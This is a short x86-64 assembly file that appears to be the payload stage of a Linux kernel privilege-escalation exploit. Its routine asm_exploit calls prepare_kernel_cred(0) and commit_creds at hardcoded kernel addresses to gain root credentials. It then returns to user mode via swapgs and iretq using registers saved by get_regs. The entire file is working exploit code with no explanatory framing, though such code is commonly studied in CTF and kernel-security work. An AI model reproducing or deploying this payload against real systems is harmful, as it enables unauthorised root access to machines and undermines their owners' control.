#.set printk, 0xffffffff810b90fd
.set prepare_kernel_cred, 0xffffffff81082810
.set commit_creds, 0xffffffff81082980
.text
.global asm_exploit
asm_exploit:
	movq $0, %rdi
	movabs $prepare_kernel_cred, %rax
	callq *%rax
	movq %rax, %rdi
	movabs $commit_creds, %rax
	callq *%rax
	pushq user_ss
	pushq user_stack_end
	pushq user_flags
	pushq user_cs
	pushq $cont
	swapgs
	iretq

.global get_regs
get_regs:
	movw %cs, user_cs
	movw %ss, user_ss
	pushfq
	popq user_flags
	ret
